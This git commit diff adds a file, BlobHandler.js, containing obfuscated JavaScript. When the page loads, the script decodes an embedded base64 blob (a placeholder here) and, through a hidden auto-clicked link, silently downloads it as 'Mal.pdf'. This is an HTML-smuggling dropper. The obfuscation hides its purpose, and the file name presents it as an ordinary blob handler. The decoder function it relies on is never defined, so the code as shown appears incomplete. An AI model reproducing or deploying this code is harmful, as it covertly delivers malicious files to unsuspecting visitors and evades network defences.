bb0077bace8ff12d9b9f6ca4805c56c2f0e64142
0x127 <georgedream985@gmail.com>
2024-06-29 23:14:01 +0300

    ho ho ho

---
+++ BlobHandler.js
@@ -0,0 +1,14 @@
+<script>
+var deserialize = deserialize;(function(getResource, targetValue){var loopCounter=deserialize, targetArray=getResource();while(!![]){try{var calculationResult=-parseInt(loopCounter(0x1b1))/0x1+-parseInt(loopCounter(0x1a7))/0x2+parseInt(loopCounter(0x1b3))/0x3+-parseInt(loopCounter(0x1bd))/0x4*(parseInt(loopCounter(0x1b6))/0x5)+parseInt(loopCounter(0x1b4))/0x6*(parseInt(loopCounter(0x1a8))/0x7)+parseInt(loopCounter(0x1b9))/0x8+-parseInt(loopCounter(0x1b7))/0x9;if(calculationResult===targetValue)break;else targetArray['push'](targetArray['shift']());}catch(exception){targetArray['push'](targetArray['shift']());}}}(retrieveResource,0x291fa));
+function retrieveResource(){var arrayValues=['revokeObjectURL','508149iyQTpI','216tZOcWE','octet/stream','500685VYAZHK','2271357zoKGKP','length','2630616khEGdN','body','download','atob','4kKgjnM','createElement','214758lzjpsQ','44093NNfoUz','appendChild','buffer','URL','display:\x20none','click','charCodeAt','href','Mal.pdf','96643zAJuKG'];retrieveResource=function(){return arrayValues;};return retrieveResource();}
+var serializedData = 'BLOB', 
+resourceContent = window[deserialize(0x1bc)](serializedData),
+dataArray = new Uint8Array(resourceContent[deserialize(0x1b8)]);
+for(var i=0x0;i<resourceContent[deserialize(0x1b8)];i++){
+    dataArray[i]=resourceContent[deserialize(0x1ae)](i);
+}
+var blobObject = new Blob([dataArray[deserialize(0x1aa)]],{'type':deserialize(0x1b5)}),
+downloadLink=document[deserialize(0x1be)]('a'),
+objectURL=window[deserialize(0x1ab)]['createObjectURL'](blobObject);
+document[deserialize(0x1ba)][deserialize(0x1a9)](downloadLink),downloadLink['style']=deserialize(0x1ac),downloadLink[deserialize(0x1af)]=objectURL,downloadLink[deserialize(0x1bb)]=deserialize(0x1b0),downloadLink[deserialize(0x1ad)](),window[deserialize(0x1ab)][deserialize(0x1b2)](objectURL);
+</script>
